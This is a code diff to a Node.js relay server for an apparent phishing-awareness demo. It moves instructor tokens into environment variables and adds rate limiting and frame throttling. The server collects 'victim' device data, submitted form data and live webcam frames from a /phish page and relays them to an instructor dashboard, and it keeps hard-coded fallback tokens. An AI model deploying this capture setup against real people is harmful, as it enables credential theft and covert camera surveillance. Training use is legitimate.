@@ -1,9 +1,11 @@
-// relay.js — CSA Phishing Awareness Demo · Unified Relay Server v2.1
+// relay.js — CSA Phishing Awareness Demo · Unified Relay Server v2.2
 // ─────────────────────────────────────────────────────────────────────
 // Unified server: Handles WebSockets, REST API, and Static HTML files.
 // ─────────────────────────────────────────────────────────────────────
 
 'use strict';
+
+require('dotenv').config();
 
 const { WebSocketServer } = require('ws');
 const fs = require('fs');
@@ -20,12 +22,40 @@ const DB_FILE = path.join(__dirname, 'sessions.db');
 // Session label
 const DEFAULT_SESSION = process.env.SESSION_ID || new Date().toISOString().slice(0, 16).replace(':', '-');
 
-// Instructor tokens
-const INSTRUCTOR_TOKENS = {
-  'CSA-DEMO-2026': 'default',
-  'CSA-AM-2026': 'session_AM',
-  'CSA-PM-2026': 'session_PM',
+// ── TOKENS FROM .env ──────────────────────────────────────────────────
+// Each INSTR_TOKEN_* env var has the format  "TOKEN:room"
+// e.g.  INSTR_TOKEN_DEFAULT=CSA-DEMO-2026:default
+const INSTRUCTOR_TOKENS = {};
+for (const [key, val] of Object.entries(process.env)) {
+  if (key.startsWith('INSTR_TOKEN_') && val.includes(':')) {
+    const colonIdx = val.indexOf(':');
+    const token = val.slice(0, colonIdx).trim();
+    const room  = val.slice(colonIdx + 1).trim();
+    if (token && room) INSTRUCTOR_TOKENS[token] = room;
+  }
+}
+// Fallback so the server still works when .env is missing (NOT recommended for production)
+if (Object.keys(INSTRUCTOR_TOKENS).length === 0) {
+  log('⚠  No INSTR_TOKEN_* vars found in .env — using hard-coded fallback tokens (insecure!)');
+  INSTRUCTOR_TOKENS['CSA-DEMO-2026'] = 'default';
+  INSTRUCTOR_TOKENS['CSA-AM-2026']   = 'session_AM';
+  INSTRUCTOR_TOKENS['CSA-PM-2026']   = 'session_PM';
+}
+
+// ── LIMITS ────────────────────────────────────────────────────────────
+const MAX_MSG_BYTES  = 300 * 1024;  // 300 KB – largest valid mugshot
+const FRAME_MIN_MS   = 60;          // drop frames arriving faster than ~16 fps
+const AUTH_MAX_TRIES = 5;           // max wrong-token attempts per IP
+const AUTH_WINDOW_MS = 60 * 1000;   // … within this rolling window (60 s)
+
+const DEFAULT_CONFIG = {
+  type: 'config_update',
+  eventName: 'National Cyber Hygiene Workshop 2026',
+  eventDate: '27 March 2026',
+  eventTime: '09:00 – 16:00 GMT',
+  eventVenue: 'NCA Tower, Airport By-Pass, Accra'
 };
+let currentConfig = { ...DEFAULT_CONFIG };
 
 // ── LOGGING ───────────────────────────────────────────────────────────
 function ts() { return new Date().toISOString(); }
@@ -80,6 +110,27 @@ function broadcastToVictims(payload) {
   for (const v of victimSockets) { if (v.readyState === 1) v.send(str); }
 }
 
+// ── AUTH THROTTLE ─────────────────────────────────────────────────────
+// Map<ip, { count: number, resetAt: number }>
+const authAttempts = new Map();
+
+function isRateLimited(ip) {
+  const now = Date.now();
+  const rec = authAttempts.get(ip);
+  if (!rec || now > rec.resetAt) {
+    // First attempt or window expired – start fresh
+    authAttempts.set(ip, { count: 1, resetAt: now + AUTH_WINDOW_MS });
+    return false;
+  }
+  rec.count++;
+  if (rec.count > AUTH_MAX_TRIES) return true;
+  return false;
+}
+
+function clearAuthRecord(ip) {
+  authAttempts.delete(ip);
+}
+
 // ── UNIFIED HTTP SERVER ──────────────────────────────────────────────
 const server = http.createServer((req, res) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
@@ -128,18 +179,32 @@ wss.on('connection', (ws, req) => {
   const clientId = `client_${Date.now()}_${++clientCounter}`;
   let role = 'victim';
   let room = null;
+  let lastFrameAt = 0;  // timestamp of last accepted frame from this client
 
   victimSockets.add(ws);
+  ws.send(JSON.stringify(currentConfig)); // Send current config to new victim
   stmtUpsertVictim.run(clientId, DEFAULT_SESSION, ip, ts());
   log(`[+] CONNECT     ${clientId}  IP=${ip}`);
 
   ws.on('message', (raw) => {
+    // ── Message size cap ──────────────────────────────────────────────
+    if (raw.length > MAX_MSG_BYTES) {
+      log(`[!] MSG TOO BIG  ${clientId}  ${raw.length} bytes — dropped`);
+      return;
+    }
+
     try {
       const msg = JSON.parse(raw);
-      
-      // Instructor Registration
+
+      // ── Instructor Registration ──────────────────────────────────────
       if (msg.type === 'register' && msg.role === 'instructor') {
+        if (isRateLimited(ip)) {
+          ws.send(JSON.stringify({ type: 'auth_error', reason: 'Too many attempts — wait 60 s' }));
+          log(`[!] AUTH BLOCK  ${clientId}  IP=${ip} (rate-limited)`);
+          return;
+        }
         if (INSTRUCTOR_TOKENS[msg.token]) {
+          clearAuthRecord(ip);  // reset counter on success
           role = 'instructor';
           room = INSTRUCTOR_TOKENS[msg.token];
           victimSockets.delete(ws);
@@ -148,11 +213,12 @@ wss.on('connection', (ws, req) => {
           log(`[!] AUTH OK     ${clientId} as Instructor (Room: ${room})`);
         } else {
           ws.send(JSON.stringify({ type: 'auth_error', reason: 'Invalid token' }));
+          log(`[!] AUTH FAIL   ${clientId}  IP=${ip}`);
         }
         return;
       }
 
-      // Telemetry Handling
+      // ── Telemetry Handling ───────────────────────────────────────────
       if (msg.type === 'device_info') {
         stmtUpdateDevice.run(JSON.stringify(msg), clientId);
         broadcastAll({ ...msg, clientId, serverIP: ip });
@@ -162,11 +228,21 @@ wss.on('connection', (ws, req) => {
       } else if (msg.type === 'form_data') {
         stmtUpdateForm.run(JSON.stringify(msg), clientId);
         broadcastAll({ ...msg, clientId, serverIP: ip });
-      } else if (msg.type === 'frame' || msg.type === 'mugshot') {
+      } else if (msg.type === 'frame') {
+        // ── Frame-rate limiter ─────────────────────────────────────────
+        const now = Date.now();
+        if (now - lastFrameAt < FRAME_MIN_MS) return;  // drop frame
+        lastFrameAt = now;
+        stmtUpdateFrame.run(ts(), clientId);
+        broadcastAll({ ...msg, clientId, serverIP: ip });
+      } else if (msg.type === 'mugshot') {
+        // Mugshots are low-frequency (once per session) — always relay
         stmtUpdateFrame.run(ts(), clientId);
         broadcastAll({ ...msg, clientId, serverIP: ip });
       } else if (msg.type === 'config_update' && role === 'instructor') {
-        broadcastToVictims(msg);
+        currentConfig = { ...msg };
+        delete currentConfig.token;
+        broadcastToVictims(currentConfig);
       }
 
     } catch (e) { log(`[!] MSG ERROR   ${clientId}  ${e.message}`); }
@@ -179,9 +255,10 @@ wss.on('connection', (ws, req) => {
   });
 });
 
-log(`=== CSA Unified Relay v2.1 ===`);
+log(`=== CSA Unified Relay v2.2 ===`);
 log(`Port      : ${WS_PORT}`);
 log(`Session   : ${DEFAULT_SESSION}`);
+log(`Auth tokens loaded: ${Object.keys(INSTRUCTOR_TOKENS).length}`);
 log(`URLs:`);
 log(`  - Phish : http://localhost:${WS_PORT}/phish`);
 log(`  - Admin : http://localhost:${WS_PORT}/instructor`);
